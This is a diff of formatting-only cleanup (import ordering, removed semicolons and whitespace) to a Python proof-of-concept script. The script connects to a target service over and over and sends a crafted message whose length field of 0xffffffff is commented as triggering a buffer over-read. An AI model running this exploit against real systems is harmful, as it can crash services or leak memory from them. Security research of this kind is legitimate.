@@ -1,5 +1,10 @@
-import socket, argparse, hexdump, time
+import argparse
+import socket
+import time
 from struct import *
+
+import hexdump
+
 
 def dump(title, data):
   print('[-- %s --]' % (title))
@@ -8,7 +13,7 @@ def dump(title, data):
 def mk_msg(type, flags, data, dlen=None):
   if dlen == None:
     dlen = len(data)
-  hdr = pack('>HHL', type, flags, dlen);
+  hdr = pack('>HHL', type, flags, dlen)
   msg = hdr + data
   return msg
 
@@ -33,7 +38,7 @@ for i in range(1,100):
   s.connect((target, port))
   s.settimeout(5)
 
-  req = pack('<L', 0x100);
+  req = pack('<L', 0x100)
   #dump('req', req)
   s.sendall(req)
   res = s.recv(4096)
@@ -44,8 +49,8 @@ for i in range(1,100):
   data += b'file_type\x00'
   data += b'unk_str1\x00'
   data += pack('>L', 0xffffffff) # -> Buffer over-read
-  data += b'A'* 16 
-   
+  data += b'A'* 16
+
   req = mk_msg(7, 0x0001, data)
   s.sendall(req)
   time.sleep(1)
